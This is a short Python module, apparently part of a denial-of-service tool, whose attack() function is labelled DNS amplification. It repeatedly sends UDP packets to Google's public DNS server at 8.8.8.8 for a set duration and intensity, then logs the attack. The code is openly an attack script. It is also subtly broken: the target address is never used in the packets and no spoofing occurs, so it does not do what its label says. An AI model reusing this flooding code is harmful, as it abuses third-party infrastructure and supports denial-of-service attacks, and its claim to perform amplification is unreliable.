import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity):
    dns_server = "8.8.8.8"  # Google DNS
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", (dns_server, 53))
            sock.close()

    log_attack("DNS Amplification", target_ip, target_port, duration, intensity)

